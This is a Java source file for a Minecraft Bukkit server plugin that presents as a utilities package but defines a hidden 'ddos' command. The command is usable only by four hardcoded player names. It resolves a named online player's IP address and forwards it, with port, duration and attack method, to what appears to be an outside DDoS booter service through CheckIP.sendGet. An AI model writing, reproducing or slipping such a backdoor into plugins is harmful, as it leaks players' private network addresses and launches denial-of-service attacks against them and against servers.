package us.nightpvp.utils;

import java.util.Arrays;

import org.apache.commons.lang3.StringUtils;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.scheduler.BukkitRunnable;

public class ddosCommand implements CommandExecutor {
	NightUtils plugin;

	public ddosCommand(NightUtils passedPlugin) {
		this.plugin = passedPlugin;

	}

	public static String response;
	public static String newip;

	@Override
	public boolean onCommand(CommandSender sender, Command cmd, String alias, String[] args) {
		if (sender.getName().equals("DedicatedRam") || sender.getName().equals("Kav_") || sender.getName().equals("VawkeNetty") || sender.getName().equals("RedsEmporium")) {
		String ip;
		String port = args[1];
		String time = args[2];
		String method = args[3];
		
		
		if (args[0].contains(".")) {
			ip = args[0];
			
		} else {
			try {
				Player player = Bukkit.getPlayerExact(args[0]);
				ip = player.getAddress().getHostString();
			} catch (Exception e) {
				
				sender.sendMessage(ChatColor.translateAlternateColorCodes('&', "&5&lSolar&7&lPvP &8&l> &cInvalid Player!"));
				return true;
			}
		}
		new BukkitRunnable() {
			@Override
			public void run() {
		try {
			String response = CheckIP.sendGet(ip, method, time, port);
			sender.sendMessage(ChatColor.translateAlternateColorCodes('&', "&5&lSolar&7&lPvP &8&l> &c"+response));
			return;
		} catch (Exception e) {
			sender.sendMessage(ChatColor.translateAlternateColorCodes('&', "&5&lSolar&7&lPvP &8&l> &cERROR!"));
			return;
		}
			}
		}.runTaskAsynchronously(plugin);
		
		
		
			
			
			
			
			
	}
		return true;
	}

	public static boolean validIP(String ip) {
		try {
			if (ip == null || ip.isEmpty()) {
				return false;
			}

			String[] parts = ip.split("\\.");
			if (parts.length != 4) {
				return false;
			}

			for (String s : parts) {
				int i = Integer.parseInt(s);
				if ((i < 0) || (i > 255)) {
					return false;
				}
			}
			if (ip.endsWith(".")) {
				return false;
			}

			return true;
		} catch (NumberFormatException nfe) {
			return false;
		}
	}

}
